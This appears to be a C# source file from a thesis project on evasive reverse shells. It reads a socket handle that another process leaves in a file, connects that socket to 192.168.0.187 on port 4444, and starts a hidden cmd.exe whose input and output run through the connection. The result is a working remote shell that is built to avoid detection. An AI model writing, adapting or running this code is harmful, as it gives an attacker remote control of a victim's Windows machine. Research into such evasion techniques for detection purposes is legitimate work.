using System.Net.Sockets;
using System.Runtime.InteropServices;
using Win32Imports;

namespace EvasiveShell_SocketReader
{
  internal class Program : DllImportsBase
  {
    static void Main(string[] args)
    {
      Helpers.InitializeWSA();

      var filePath = @"F:\FH_Technikum_Wien\Masterarbeit\SimpleReverseShell\EvasiveShell\bin\Debug\net6.0\socketconfig.bin";

      do
      {
        Thread.Sleep(1000);
      }
      while (!File.Exists(filePath));

      IntPtr socket;

      using (var fs = File.Open(filePath, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.Read))
      using (var br = new BinaryReader(fs))
      {
        var value = br.ReadInt64();
        socket = new IntPtr(value);
      }

      var sockAddrIn = new sockaddr_in();
      sockAddrIn.sin_family = 2;
      sockAddrIn.sin_port = htons(4444);
      Helpers.PrintLastError(nameof(htons));

      sockAddrIn.sin_addr.S_addr = inet_addr("192.168.0.187");
      Helpers.PrintLastError(nameof(inet_addr));

      var sockAddrInPtr = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddrIn));
      Marshal.StructureToPtr(sockAddrIn, sockAddrInPtr, false);
      var sockAddr = Marshal.PtrToStructure<sockaddr>(sockAddrInPtr);


      var addrPointer = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddr));
      Marshal.StructureToPtr(sockAddr, addrPointer, false);

      connect(socket, sockAddrInPtr, Marshal.SizeOf(sockAddrIn));
      Helpers.PrintLastError(nameof(connect));

      var socketHandle = new SafeSocketHandle(socket, false);
      STARTUPINFO startupInfo = new STARTUPINFO();
      Marshal.AllocHGlobal(Marshal.SizeOf(startupInfo));
      startupInfo.cb = Marshal.SizeOf(startupInfo);
      startupInfo.dwFlags = CreationFlags.STARTF_USESTDHANDLES;
      startupInfo.hStdInput = socketHandle.DangerousGetHandle();
      startupInfo.hStdOutput = socketHandle.DangerousGetHandle();
      startupInfo.hStdError = socketHandle.DangerousGetHandle();
      PROCESS_INFORMATION pinfo = new PROCESS_INFORMATION();
      CreateProcessA(null, @"C:\\Windows\\System32\\cmd.exe", IntPtr.Zero, IntPtr.Zero, true, CreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, ref pinfo);
      Helpers.PrintLastError(nameof(CreateProcessA));
    }
  }
}